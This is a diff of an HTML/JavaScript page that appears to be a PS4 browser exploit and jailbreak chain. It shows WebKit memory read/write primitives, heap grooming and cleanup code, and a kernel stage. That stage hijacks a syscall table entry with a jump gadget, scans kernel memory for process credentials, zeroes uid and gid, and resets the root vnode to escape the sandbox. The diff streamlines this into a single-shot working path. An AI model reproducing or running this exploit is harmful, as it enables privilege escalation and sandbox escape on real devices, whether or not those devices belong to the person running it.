-        scheduleRetry("fake-addr-fail");
+        failTerminal("fake-addr-fail");
         return;
     }
     mark("FAKE-ADDRESS", "host=" + hex(hostAddress) + "-fake=" + hex(fakeAddress) + "-delta=0x10");
     runGroomAndLoad();
-}
-
-function compactLog(keep) {
-    var log = document.getElementById("log");
-    if (!log) return;
-    var max = keep || 96;
-    while (log.childNodes.length > max) log.removeChild(log.firstChild);
-}
-
-function dropFillerGraphBatched() {
-    var graph = fillerGraph;
-    fillerGraph = null;
-    outerGraph = null;
-    if (!graph) return;
-    var batch = 4096;
-    var idx = 0;
-    function step() {
-        if (!graph) return;
-        var end = Math.min(idx + batch, graph.length);
-        for (var i = idx; i < end; i++) graph[i] = null;
-        idx = end;
-        if (idx < graph.length) setTimeout(step, 0);
-        else {
-            graph.length = 0;
-            graph = null;
-            mark("FILLER-FREED", "batched");
-        }
-    }
-    setTimeout(step, 0);
-}
-
-function dropCarrierBatched() {
-    var carrier = getterCarrier;
-    getterCarrier = null;
-    if (!carrier) return;
-    var batch = 12000;
-    var idx = 0;
-    function step() {
-        if (!carrier) return;
-        var end = Math.min(idx + batch, CARRIER_SLOTS);
-        for (var i = idx; i < end; i++) {
-            try { delete carrier[i]; } catch (_) {}
-        }
-        idx = end;
-        if (idx < CARRIER_SLOTS) setTimeout(step, 20);
-        else {
-            carrier = null;
-            mark("CARRIER-FREED", "slots=" + CARRIER_SLOTS);
-        }
-    }
-    setTimeout(step, 80);
-}
-
-function dropFillerGraphImmediate() {
-    if (fillerGraph) {
-        fillerGraph.length = 0;
-        fillerGraph = null;
-    }
-    outerGraph = null;
-}
-
-function trimCarrierTailBatched(done) {
-    if (!getterCarrier || CARRIER_SLOTS <= 4) {
-        if (done) done(0);
-        return;
-    }
-    var carrier = getterCarrier;
-    var idx = 4;
-    var batch = 25000;
-    var freed = 0;
-    function step() {
-        var end = Math.min(idx + batch, CARRIER_SLOTS);
-        for (var i = idx; i < end; i++) {
-            try {
-                if (i in carrier) {
-                    delete carrier[i];
-                    freed++;
-                }
-            } catch (_) {}
-        }
-        idx = end;
-        if (idx < CARRIER_SLOTS) setTimeout(step, 0);
-        else {
-            mark("CARRIER-TRIM", "freed=" + freed + "-kept-slots-0-3");
-            if (done) done(freed);
-        }
-    }
-    setTimeout(step, 0);
-}
-
-function detachCarrierAfterRw() {
-    if (!globalFakeArray) return;
-    getterCarrier = null;
-}
-
-// Groom/filler only — control POC keeps carrier; we drop groom heap only (carrier trim OOMs at gate).
-function releasePostRwGroomOnly() {
-    stageUiMuted = true;
-    try { history.replaceState(null, ""); } catch (_) {}
-    referenceTarget = null;
-    preparedSymbolObject = null;
-    capturedString = null;
-    capturedWords = null;
-    leakedScope = null;
-    predecessorWords = null;
-    rwHeader = null;
-    targetHeader = null;
-    for (var i = 0; i < keepAlive.length; i++) keepAlive[i] = null;
-    keepIndex = 0;
-    dropFillerGraphImmediate();
-    detachCarrierAfterRw();
-    compactLog(16);
-    mark("MEM-TRIM", "groom+filler-out-carrier-detached=" + (getterCarrier === null));
-}
-
-// Drop SSV/addrof/groom garbage after RW is live (PS4 browser OOMs if one big GC spike).
-function releasePreJailbreakMemory() {
-    try { history.replaceState(null, ""); } catch (_) {}
-    referenceTarget = null;
-    fakeHost = null;
-    preparedSymbolObject = null;
-    capturedString = null;
-    capturedWords = null;
-    leakedScope = null;
-    predecessorWords = null;
-    rwHeader = null;
-    targetHeader = null;
-    for (var i = 0; i < keepAlive.length; i++) keepAlive[i] = null;
-    keepIndex = 0;
-    compactLog(80);
-    dropFillerGraphBatched();
-    dropCarrierBatched();
-    mark("MEM-RELEASE", "staggered-drop-scheduled");
-}
-
-var surviveTimerIds = [];
-
-function clearSurvivalMarks() {
-    for (var i = 0; i < surviveTimerIds.length; i++) clearTimeout(surviveTimerIds[i]);
-    surviveTimerIds.length = 0;
-}
-
-function scheduleSurvivalMarks() {
-    if (RUN_KERNEL_STAGE) return;
-    clearSurvivalMarks();
-    var sv = SURVIVE_MS;
-    surviveTimerIds.push(setTimeout(function() { mark("SURVIVED-T100"); }, sv.t100));
-    surviveTimerIds.push(setTimeout(function() { mark("SURVIVED-T1000"); }, sv.t1k));
-    surviveTimerIds.push(setTimeout(function() { mark("SURVIVED-T3000"); }, sv.t3k));
 }
 
 // ========== R/W PRIMITIVES ==========
@@ -1495,275 +1380,42 @@ function write64(addr, value) {
     for (var i = 0; i < 8; i++) globalFakeArray[0x10 + i] = rwVecSave[i];
 }
 
-// ========== KERNEL LAB (R/W probe + kbase, no sysent hijack) ==========
-function runKernelLab() {
-    mark("===== KERNEL-LAB START =====", "fw=" + FW_LABEL);
-    mark("KERNEL-LAB-NOTE", "scan-sysent-VA-first-kbase-is-derived-not-assumed");
-    clearSurvivalMarks();
-    compactLog(40);
-    var sysent = fwOffsets.sysent;
-    var prison0 = fwOffsets.prison0;
+// ========== PS4 JAILBREAK (only reached when ?jb=1) ==========
+function runJailbreak(kbase) {
+    mark("===== PS4 JAILBREAK START =====", "fw=" + FW_LABEL);
+    compactLog(48);
 
-    sampleKernelReads(sysent);
-
-    var hit = findSysent661Absolute(sysent, prison0);
-    if (hit) {
-        markSysentProbeAt(hit.se, hit.kb);
-        var prisonOk = false;
-        try {
-            var pr = read64(hit.kb + BigInt(prison0));
-            prisonOk = kptrBig(pr);
-            mark("KERNEL-READ-PRISON0", hex(pr) + "-ok=" + prisonOk);
-        } catch (e) {
-            mark("KERNEL-READ-PRISON0", "err=" + e.message);
-        }
-        mark("KBASE-DERIVED", hex(hit.kb) + "-from-se=" + hex(hit.se));
-        mark("KERNEL-RW-OK", "sysent661-pattern-at-kernel-VA");
-        persistKernelBase(hit.kb);
-        mark("KERNEL-LAB-DONE", "kb=0x" + hit.kb.toString(16) + "-next=jb.html?jb=1");
+    if (kbase == null || !kptrBig(kbase)) {
+        mark("JAILBREAK-ABORT", "invalid-kbase");
         return;
     }
 
-    markSysentProbeAt(KBASE_DEFAULT + BigInt(sysent), KBASE_DEFAULT);
-    var seDefault = KBASE_DEFAULT + BigInt(sysent);
-    var nargD = 0n;
-    var callD = 0n;
-    try {
-        nargD = read64(seDefault) & 0xFFFFFFFFn;
-        callD = read64(seDefault + 8n);
-    } catch (_) {}
-    var anyKernelShape = kptrBig(callD) && nargD <= 12n;
-    mark("KERNEL-RW-PROBE", "default-se-narg=" + nargD + "-call=" + hex(callD) + "-shape=" + anyKernelShape);
-    if (anyKernelShape) {
-        var kbGuess = deriveKbaseFromSysentVa(seDefault, sysent);
-        mark("KBASE-DERIVED", hex(kbGuess) + "-weak-from-default-se");
-        mark("KERNEL-RW-OK", "loose-sysent-shape-at-default-VA-not-slide-verified");
-        persistKernelBase(kbGuess);
-        mark("KERNEL-LAB-DONE", "weak-kb=0x" + kbGuess.toString(16) + "-try-jb=1-or-check-KERNEL-READ-SAMPLES");
-    } else {
-        mark("KERNEL-RW-OK", "miss-no-sysent-pattern-kernel-VA-may-not-be-readable-from-webkit-RW");
-        mark("KERNEL-LAB-DONE", "compare-KERNEL-READ-SAMPLES-vs-user-host-same=primitive-not-reaching-kernel");
-    }
-}
-
-// Control POC path: fixed kbase 0xFFFFFFFF80000000, hijack first (Downloads/1350-webkit-test-main).
-function runJailbreakSimple(meta) {
-    mark("JB-MODE", "control-poc-fixed-kbase");
-    clearSurvivalMarks();
-    compactLog(32);
     var evf = fwOffsets.evf;
     var prison0 = fwOffsets.prison0;
     var rootvnode = fwOffsets.rootvnode;
     var sysent = fwOffsets.sysent;
     var jmp = firmwareJmpOffset();
-    var kbase = KBASE_DEFAULT;
-    if (Q.get("kb")) {
-        var qkb = kernelBaseFromQuery();
-        if (qkb !== null) kbase = qkb;
-    }
-
-    try {
-        mark("KERNEL-BASE", hex(kbase));
-
-        var sysent_661 = kbase + BigInt(sysent);
-        var jmp_rsi = kbase + BigInt(jmp);
-        mark("SYSENT-661", hex(sysent_661));
-        mark("JMP-RSI", hex(jmp_rsi));
-
-        var sy_narg = Number(read64(sysent_661) & 0xFFFFFFFFn);
-        var sy_call = read64(sysent_661 + 8n);
-        var sy_thrcnt = Number(read64(sysent_661 + 0x2Cn) & 0xFFFFFFFFn);
-
-        if (Q.get("khij") === "0") {
-            mark("SYSENT-HIJACK-SKIP", "khij=0");
-            mark("===== JAILBREAK COMPLETE =====", "kernel-rw-only");
-            return;
-        }
-
-        write64(sysent_661, 2n);
-        write64(sysent_661 + 8n, jmp_rsi);
-        write64(sysent_661 + 0x2Cn, 1n);
-        mark("SYSENT-HIJACKED", "success");
-
-        var proc = kbase + BigInt(evf);
-        var sandboxEscaped = false;
-        var verifyUid = -1n;
-        var verifyGid = -1n;
-        var verifyPrison = -1n;
-        var dbgMode = Q.get("dbg") === "1";
-
-        function patchAndVerifyUcred(ucred, prisonVal) {
-            write64(ucred + 0x04n, 0n);
-            write64(ucred + 0x08n, 0n);
-            write64(ucred + 0x0Cn, 0n);
-            write64(ucred + 0x10n, 1n);
-            write64(ucred + 0x30n, prisonVal);
-            verifyUid = read64(ucred + 0x04n);
-            verifyGid = read64(ucred + 0x08n);
-            verifyPrison = read64(ucred + 0x30n);
-            return verifyUid === 0n && verifyGid === 0n && verifyPrison === prisonVal;
-        }
-
-        var prisonVal = read64(kbase + BigInt(prison0));
-        mark("PRISON0", hex(prisonVal));
-        var hits = 0;
-        for (var i = 0; i < 0x4000; i += 8) {
-            try {
-                var candidate = read64(proc + BigInt(i));
-                if ((candidate & 0xFFFFFFFFn) === 0x726f7272n) {
-                    hits++;
-                    var ucred = read64(proc + BigInt(i - 0x40));
-                    if (ucred > 0n && ucred < 0xffffffffffffn) {
-                        if (dbgMode) mark("SCAN-HIT", "marker-off=0x" + i.toString(16) + "-ucred=" + hex(ucred));
-                        if (patchAndVerifyUcred(ucred, prisonVal)) {
-                            sandboxEscaped = true;
-                            mark("SANDBOX-ESCAPE", "success");
-                            mark("VERIFY-UID", "uid=" + verifyUid + "-gid=" + verifyGid + "-prison-matches=true");
-                        }
-                        break;
-                    }
-                }
-            } catch (e) {}
-        }
-        if (!sandboxEscaped && hits > 0) mark("SANDBOX-ESCAPE", "marker-hits=" + hits + "-ucred-not-found");
-
-        if (!sandboxEscaped) {
-            var sigStart = proc - 0x4000n;
-            var sigEnd = proc + 0x4000n;
-            for (var s = sigStart; s < sigEnd && !sandboxEscaped; s += 8n) {
-                try {
-                    var ref = Number(read64(s) & 0xFFFFFFFFn);
-                    if (ref < 1 || ref > 0x200) continue;
-                    var ngroups = Number(read64(s + 0x10n) & 0xFFFFFFFFn);
-                    if (ngroups < 1 || ngroups > 0x80) continue;
-                    var pr = read64(s + 0x30n);
-                    if (pr !== prisonVal) continue;
-                    if (dbgMode) mark("UCRED-SIG-CANDIDATE", hex(s) + "-ref=" + ref + "-groups=" + ngroups);
-                    if (patchAndVerifyUcred(s, prisonVal)) {
-                        sandboxEscaped = true;
-                        mark("UCRED-SIG-FOUND", hex(s));
-                        mark("SANDBOX-ESCAPE", "success");
-                        mark("VERIFY-UID", "uid=" + verifyUid + "-gid=" + verifyGid + "-prison-matches=true");
-                    }
-                } catch (e) {}
-            }
-            if (!sandboxEscaped) mark("SANDBOX-ESCAPE", "FAILED-not-found");
-        }
-
-        var rootVerified = false;
-        var root = read64(kbase + BigInt(rootvnode));
-        if (root > 0n && root < 0xffffffffffffn) {
-            var fd = read64(proc + 0x48n);
-            write64(fd + 0x10n, root);
-            write64(fd + 0x18n, root);
-            var fdCheck = read64(fd + 0x10n);
-            rootVerified = fdCheck === root;
-            mark("ROOT-VNODE-SET", rootVerified ? "success" : "mismatch");
-        } else {
-            mark("ROOT-VNODE-SET", "FAILED-invalid-root");
-        }
-
-        write64(sysent_661, BigInt(sy_narg));
-        write64(sysent_661 + 8n, sy_call);
-        write64(sysent_661 + 0x2Cn, BigInt(sy_thrcnt));
-        mark("SYSENT-RESTORED", "success");
-        mark("===== JAILBREAK COMPLETE =====", "PS4 " + FW_LABEL + " root=" + sandboxEscaped + "-fs=" + rootVerified + "-simple=1");
-    } catch (error) {
-        mark("JAILBREAK-ERROR", error.message);
-    }
-}
-
-// ========== PS4 JAILBREAK ==========
-function runJailbreak() {
-    compactLog(8);
-    mark("===== PS4 JAILBREAK START =====", "fw=" + FW_LABEL);
-    clearSurvivalMarks();
-
-    if (SIMPLE_JB) {
-        runJailbreakSimple(null);
-        return;
-    }
-
-    var evf = fwOffsets.evf;
-    var prison0 = fwOffsets.prison0;
-    var rootvnode = fwOffsets.rootvnode;
-    var sysent = fwOffsets.sysent;
-    var jmp = fwOffsets.jmp;
-    var allprocOff = fwOffsets.allproc || 0;
-    var skipKhij = Q.get("khij") === "0";
-
-    resolveKernelBaseForStage(sysent, prison0, function onKbase(meta) {
-        runJailbreakWithKbase(meta);
-    });
-
-    function runJailbreakWithKbase(meta) {
-    var kbase = meta.kb;
-    var kbaseLocated = meta.located;
-    var verified = meta.strict || meta.loose;
-    var sysent_661, jmp_rsi;
-    var sy_narg, sy_call, sy_thrcnt, proc, sandboxEscaped, verifyUid, verifyGid, verifyPrison;
-    var dbgMode, prisonVal, hits, scanOff, sigPtr, sigEnd;
-    var procCandidates, procCandIdx, procResolved;
+    var kbaseTag = Q.get("kb") ? "query" : (Q.get("kbscan") === "0" ? "default" : "scan");
+    var sysent_661, jmp_rsi, sy_narg, sy_call, sy_thrcnt;
+    var proc = kbase + BigInt(evf);
+    var sandboxEscaped = false;
+    var verifyUid = -1n, verifyGid = -1n, verifyPrison = -1n;
+    var dbgMode = Q.get("dbg") === "1";
+    var prisonVal, hits = 0, scanOff = 0;
+    var sigPtr, sigEnd;
     var sysentHijacked = false;
-    var allprocList = [];
-    var allprocIdx = 0;
 
     try {
-        mark("KERNEL-BASE", hex(kbase) + (kbaseLocated ? (meta.strict ? "-strict" : "-loose") : "-NOT-LOCATED"));
-        markSysentProbe(kbase, sysent);
-        if (!kbaseLocated) mark("KBASE-WARN", "see-SYSENT-PROBE-set-kb=-or-run-poops-kl_lock-leak");
-
+        mark("KERNEL-BASE", hex(kbase) + "-" + kbaseTag);
         sysent_661 = kbase + BigInt(sysent);
         jmp_rsi = kbase + BigInt(jmp);
         mark("SYSENT-661", hex(sysent_661));
         mark("JMP-RSI", hex(jmp_rsi));
-
-        proc = 0n;
-        procResolved = false;
-        var harvested = harvestKernelPtrsNearHost();
-        mark("PROC-HARVEST", "host=" + (isFinite(hostAddress) ? hex(hostAddress) : "na") + "-kptrs=" + harvested.length);
-        allprocList = enumerateAllproc(kbase, allprocOff, 320);
-        if (fwOffsets.allprocMx && fwOffsets.allprocMx !== allprocOff) {
-            var mxList = enumerateAllproc(kbase, fwOffsets.allprocMx, 320);
-            for (var mx = 0; mx < mxList.length; mx++) allprocList.push(mxList[mx]);
-        }
-        mark("ALLPROC-WALK", "count=" + allprocList.length + "-hen=" + (allprocOff ? hex(allprocOff) : "na") + "-mx=" + (fwOffsets.allprocMx ? hex(fwOffsets.allprocMx) : "na"));
-        procCandidates = buildProcCandidates(kbase, evf, harvested);
-        for (var ap = 0; ap < allprocList.length; ap++) {
-            procCandidates.push(allprocList[ap]);
-        }
-        procCandIdx = 0;
-        mark("PROC-CAND", "count=" + procCandidates.length + "-allproc=" + allprocList.length);
-
         prisonVal = read64(kbase + BigInt(prison0));
         mark("PRISON0", hex(prisonVal));
-
-        sandboxEscaped = false;
-        verifyUid = -1n;
-        verifyGid = -1n;
-        verifyPrison = -1n;
-        dbgMode = Q.get("dbg") === "1";
-        hits = 0;
-        scanOff = 0;
-        allprocIdx = 0;
-
-        if (skipKhij) {
-            mark("SYSENT-HIJACK-SKIP", "khij=0");
-            mark("KERNEL-STAGE-MISS", "kexploit-arm-disabled");
-            mark("===== JAILBREAK COMPLETE =====", "userland-rw=OK-khij=0");
-            return;
-        }
-        if (!kbaseLocated && Q.get("forcekhij") !== "1") {
-            mark("SYSENT-HIJACK-SKIP", "kbase-not-located-forcekhij=1-to-arm-anyway");
-            mark("KERNEL-STAGE-MISS", "kexploit-needs-kbase-from-kl_lock-leak-or-kb=");
-            mark("===== JAILBREAK COMPLETE =====", "userland-rw=OK-kexploit=NOT-ARMED");
-            return;
-        }
-
         sy_narg = Number(read64(sysent_661) & 0xFFFFFFFFn);
         sy_call = read64(sysent_661 + 8n);
         sy_thrcnt = Number(read64(sysent_661 + 0x2Cn) & 0xFFFFFFFFn);
-
         write64(sysent_661, 2n);
         write64(sysent_661 + 8n, jmp_rsi);
         write64(sysent_661 + 0x2Cn, 1n);
@@ -1798,30 +1450,21 @@ function runJailbreak() {
     function finalizeJailbreak() {
         try {
             var rootVerified = false;
-            if (sandboxEscaped && procResolved && kptrBig(proc)) {
+            if (sandboxEscaped && kptrBig(proc)) {
                 var root = read64(kbase + BigInt(rootvnode));
                 if (root > 0n && root < 0xffffffffffffn) {
                     var fd = read64(proc + 0x48n);
                     if (kptrBig(fd)) {
                         write64(fd + 0x10n, root);
                         write64(fd + 0x18n, root);
-                        var fdCheck = read64(fd + 0x10n);
-                        rootVerified = fdCheck === root;
+                        rootVerified = read64(fd + 0x10n) === root;
                         mark("ROOT-VNODE-SET", rootVerified ? "success" : "mismatch");
-                        mark("VERIFY-ROOTVNODE", "fd=" + hex(fd) + "-readback=" + (fdCheck === root));
-                    } else {
-                        mark("ROOT-VNODE-SET", "FAILED-bad-fd");
-                    }
-                } else {
-                    mark("ROOT-VNODE-SET", "FAILED-invalid-root");
-                }
-            } else {
-                mark("ROOT-VNODE-SET", "FAILED-no-curproc");
-            }
+                    } else mark("ROOT-VNODE-SET", "FAILED-bad-fd");
+                } else mark("ROOT-VNODE-SET", "FAILED-invalid-root");
+            } else mark("ROOT-VNODE-SET", "FAILED-no-escape");
             restoreSysent();
-            if (sandboxEscaped) mark("KERNEL-STAGE-OK", "sandbox-escaped");
-            else mark("KERNEL-STAGE-MISS", "no-curproc-allproc-and-marker-miss");
-            mark("===== JAILBREAK COMPLETE =====", "PS4 " + FW_LABEL + " sandbox=" + sandboxEscaped + "-fs=" + rootVerified + "-userland-rw=OK");
+            mark("===== JAILBREAK COMPLETE =====", "PS4 " + FW_LABEL + " root=" + sandboxEscaped + "-fs=" + rootVerified);
+            maybeAutoSave();
         } catch (error) {
             try { restoreSysent(); } catch (_) {}
             mark("JAILBREAK-ERROR", error.message);
@@ -1829,21 +1472,11 @@ function runJailbreak() {
     }
 
     function beginSigScanOrFinish() {
-        mark("KSCAN-PROC-DONE", "hits=" + hits + "-escaped=" + sandboxEscaped + "-proc=" + (procResolved ? hex(proc) : "none"));
-        if (sandboxEscaped) {
-            setTimeout(finalizeJailbreak, 0);
-            return;
-        }
+        mark("KSCAN-PROC-DONE", "hits=" + hits + "-escaped=" + sandboxEscaped);
+        if (sandboxEscaped) { setTimeout(finalizeJailbreak, 0); return; }
         if (hits > 0) mark("SANDBOX-ESCAPE", "marker-hits=" + hits + "-ucred-not-found");
         if (hits === 0 && !FORCE_UCRED_SIG_SCAN) {
-            mark("KSCAN-SIG-SKIP", "no-proc-marker-ksig=1-to-force-wide-scan");
-            mark("SANDBOX-ESCAPE", "FAILED-no-proc-fix-kb-or-kbase-leak");
-            setTimeout(finalizeJailbreak, 0);
-            return;
-        }
-        if (!procResolved || !kptrBig(proc)) {
-            mark("KSCAN-SIG-SKIP", "no-valid-proc-anchor");
-            mark("SANDBOX-ESCAPE", "FAILED-no-proc");
+            mark("KSCAN-SIG-SKIP", "ksig=1-for-wide-scan");
             setTimeout(finalizeJailbreak, 0);
             return;
         }
@@ -1862,14 +1495,11 @@ function runJailbreak() {
                 if (ref < 1 || ref > 0x200) continue;
                 var ngroups = Number(read64(sigPtr + 0x10n) & 0xFFFFFFFFn);
                 if (ngroups < 1 || ngroups > 0x80) continue;
-                var pr = read64(sigPtr + 0x30n);
-                if (pr !== prisonVal) continue;
-                if (dbgMode) mark("UCRED-SIG-CANDIDATE", hex(sigPtr) + "-ref=" + ref + "-groups=" + ngroups);
+                if (read64(sigPtr + 0x30n) !== prisonVal) continue;
+                if (dbgMode) mark("UCRED-SIG-CANDIDATE", hex(sigPtr));
                 if (patchAndVerifyUcred(sigPtr, prisonVal)) {
                     sandboxEscaped = true;
-                    mark("UCRED-SIG-FOUND", hex(sigPtr));
                     mark("SANDBOX-ESCAPE", "success");
-                    mark("VERIFY-UID", "uid=" + verifyUid + "-gid=" + verifyGid + "-prison-matches=true");
                 }
             }
             if (!sandboxEscaped && sigPtr < sigEnd) setTimeout(scanSigChunk, 0);
@@ -1883,194 +1513,55 @@ function runJailbreak() {
         }
     }
 
-    function tryDirectUcredOnProc() {
-        if (!kptrBig(proc)) return false;
-        var ucred = read64(proc + 0x40n);
-        if (!kptrBig(ucred)) return false;
-        if (read64(ucred + 0x30n) !== prisonVal) return false;
-        if (dbgMode) mark("SCAN-HIT", "direct-p-ucred=" + hex(ucred));
-        if (patchAndVerifyUcred(ucred, prisonVal)) {
-            sandboxEscaped = true;
-            mark("SANDBOX-ESCAPE", "success-direct-p-ucred");
-            mark("VERIFY-UID", "uid=" + verifyUid + "-gid=" + verifyGid + "-prison-matches=true");
-            return true;
-        }
-        return false;
-    }
-
-    function advanceProcCandidate() {
-        while (procCandIdx < procCandidates.length) {
-            proc = procCandidates[procCandIdx++];
-            scanOff = 0;
-            procResolved = kptrBig(proc);
-            mark("PROC-CAND", hex(proc) + "-idx=" + procCandIdx + "/" + procCandidates.length);
-            if (procResolved && tryDirectUcredOnProc()) return "escaped";
-            if (procResolved) return "scan";
-        }
-        proc = 0n;
-        procResolved = false;
-        return "done";
-    }
-
     function scanProcChunk() {
         try {
-            if (!procResolved) {
-                var adv = advanceProcCandidate();
-                if (adv === "escaped") {
-                    setTimeout(finalizeJailbreak, 0);
-                    return;
-                }
-                if (adv === "done") {
-                    setTimeout(beginSigScanOrFinish, 0);
-                    return;
-                }
-            }
             var end = Math.min(scanOff + 0x100, 0x4000);
             for (; scanOff < end; scanOff += 8) {
                 var candidate = read64(proc + BigInt(scanOff));
                 if ((candidate & 0xFFFFFFFFn) === 0x726f7272n) {
                     hits++;
                     var ucred = read64(proc + BigInt(scanOff - 0x40));
-                    if (kptrBig(ucred)) {
-                        if (dbgMode) mark("SCAN-HIT", "marker-off=0x" + scanOff.toString(16) + "-ucred=" + hex(ucred));
-                        if (patchAndVerifyUcred(ucred, prisonVal)) {
-                            sandboxEscaped = true;
-                            mark("SANDBOX-ESCAPE", "success");
-                            mark("VERIFY-UID", "uid=" + verifyUid + "-gid=" + verifyGid + "-prison-matches=true");
-                        }
+                    if (kptrBig(ucred) && patchAndVerifyUcred(ucred, prisonVal)) {
+                        sandboxEscaped = true;
+                        mark("SANDBOX-ESCAPE", "success");
                         break;
                     }
                 }
             }
-            if (sandboxEscaped) {
-                setTimeout(finalizeJailbreak, 0);
-                return;
-            }
-            if (scanOff < 0x4000) {
-                setTimeout(scanProcChunk, 0);
-                return;
-            }
-            procResolved = false;
-            setTimeout(scanProcChunk, 0);
+            if (sandboxEscaped) setTimeout(finalizeJailbreak, 0);
+            else if (scanOff < 0x4000) setTimeout(scanProcChunk, 0);
+            else setTimeout(beginSigScanOrFinish, 0);
         } catch (error) {
             try { restoreSysent(); } catch (_) {}
             mark("JAILBREAK-ERROR", error.message);
         }
     }
 
-    function tryAllprocEscapeChunk() {
-        try {
-            if (allprocList.length === 0) {
-                setTimeout(startMarkerScan, 0);
-                return;
-            }
-            if (allprocIdx >= allprocList.length) {
-                setTimeout(startMarkerScan, 0);
-                return;
-            }
-            mark("ALLPROC-TRY", "idx=" + allprocIdx + "/" + allprocList.length);
-            proc = allprocList[allprocIdx++];
-            procResolved = true;
-            if (tryDirectUcredOnProc()) {
-                mark("SANDBOX-ESCAPE", "success-allproc-direct");
-                setTimeout(finalizeJailbreak, 0);
-                return;
-            }
-            setTimeout(tryAllprocEscapeChunk, 0);
-        } catch (error) {
-            try { restoreSysent(); } catch (_) {}
-            mark("JAILBREAK-ERROR", error.message);
-        }
-    }
-
-    function startMarkerScan() {
-        compactLog(32);
-        var kbaseOk = probeKernelBaseLoose(kbase, sysent);
-        if (!kbaseOk || (allprocList.length === 0 && procCandidates.length <= 2)) {
-            mark("KSCAN-SKIP", "kbase-loose=" + kbaseOk + "-allproc=" + allprocList.length + "-cand=" + procCandidates.length);
-            mark("SANDBOX-ESCAPE", "FAILED-no-kbase-or-allproc-set-kb=0x...");
-            setTimeout(finalizeJailbreak, 0);
-            return;
-        }
-        mark("KSCAN-BEGIN", "candidates=" + procCandidates.length);
-        procCandIdx = 0;
-        procResolved = false;
-        setTimeout(scanProcChunk, 0);
-    }
-
-    function startKernelScan() {
-        compactLog(40);
-        setTimeout(tryAllprocEscapeChunk, 0);
-    }
-
-    setTimeout(startKernelScan, 150);
-    }
+    mark("KSCAN-BEGIN", "proc=" + hex(proc));
+    setTimeout(scanProcChunk, 150);
 }
 
-// ========== AUTO-RETRY ENGINE ==========
+// ========== SINGLE-SHOT ENTRY ==========
 var attemptSucceeded = false;
 
-function cleanupForRetry() {
-    try { history.replaceState(undefined, ""); } catch (_) {}
-    try { sessionStorage.removeItem(REVISION + ":blocked"); } catch (_) {}
-    try { sessionStorage.removeItem(REVISION + ":passed"); } catch (_) {}
-    getterCarrier = null;
-    preparedSymbolObject = null;
-    capturedString = null;
-    capturedWords = null;
-    fillerGraph = null;
-    outerGraph = null;
-    rwBuffer = null; rwView = null; rwMirror = null;
-    targetBuffer = null; targetView = null;
-    globalFakeArray = null;
-    referenceTarget = null;
-    lengthWord = null;
-    predecessorWords = null;
-    leakedScope = null;
-    for (var i = 0; i < keepAlive.length; i++) keepAlive[i] = null;
-    keepIndex = 0;
-    captureState = 0;
-    hostAddress = NaN; fakeAddress = NaN; targetAddress = NaN;
-    rwHeaderOK = false; targetHeaderOK = false;
-    readObserved = false; writeObserved = false; restoreObserved = false;
-    compositionState = 0;
-    retrySafe = false;
-}
-
-function scheduleRetry(reason) {
-    attemptSucceeded = false;
-    if (attemptNumber >= MAX_ATTEMPTS) {
-        mark("GIVE-UP", "all-" + MAX_ATTEMPTS + "-attempts-failed last=" + reason);
-        mark("ADVICE", "power-cycle-the-ps4-fresh-boot-then-one-clean-load");
-        return;
-    }
-    mark("RETRY", "reason=" + reason + "-next=" + (attemptNumber + 1) + "-of-" + MAX_ATTEMPTS);
-    setTimeout(runAttempt, 1500);
-}
-
 function runAttempt() {
-    attemptNumber++;
-    if (attemptNumber > 1) cleanupForRetry();
-    updateMeta();
-    mark("ATTEMPT", attemptNumber + "-of-" + MAX_ATTEMPTS + "-n=" + DRAIN_COUNT);
+    mark("BOOT", "rev=" + REVISION + "-k=" + K + "-n=" + DRAIN_COUNT + "-c=" + CARRIER_SLOTS + "-jb=" + (RUN_JAILBREAK ? "on" : "off") + "-jbdelay=" + JB_DELAY_MS);
     try {
         buildAndStoreGraph();
         prepareAddrof();
     } catch (error) {
         mark("SETUP-THREW", (error && error.name) + ":" + String(error && error.message).slice(0, 80));
-        scheduleRetry("setup");
+        failTerminal("setup");
     }
 }
 
 // ========== INIT ==========
-updateMeta();
-renderStages();
-mark("BOOT", "rev=" + REVISION + "-k=" + K + "-n=" + DRAIN_COUNT + "-c=" + CARRIER_SLOTS + "-r=" + MAX_ATTEMPTS + "-jb=" + (RUN_JAILBREAK ? "1" : "0") + "-klab=" + (KERNEL_LAB ? "1" : "0") + "-simplejb=" + (SIMPLE_JB ? "1" : "0") + "-mem=" + (MEM_DROP_AFTER_RW ? "drop" : "keep") + "-jbdelay=" + JB_DELAY_MS + "-ksig=" + (FORCE_UCRED_SIG_SCAN ? "1" : "0"));
 try {
-    runAttempt();
-} catch (error) {
-    mark("SETUP-THREW", (error && error.name) + ":" + String(error && error.message).slice(0, 80));
-}
+    document.getElementById("toolbarMeta").textContent =
+        "rev " + REVISION + " · fw " + (FW_LABEL || "?") + " · jb " + (RUN_JAILBREAK ? "ON" : "OFF");
+} catch (_) {}
+
+runAttempt();
 </script>
 </body>
 </html>
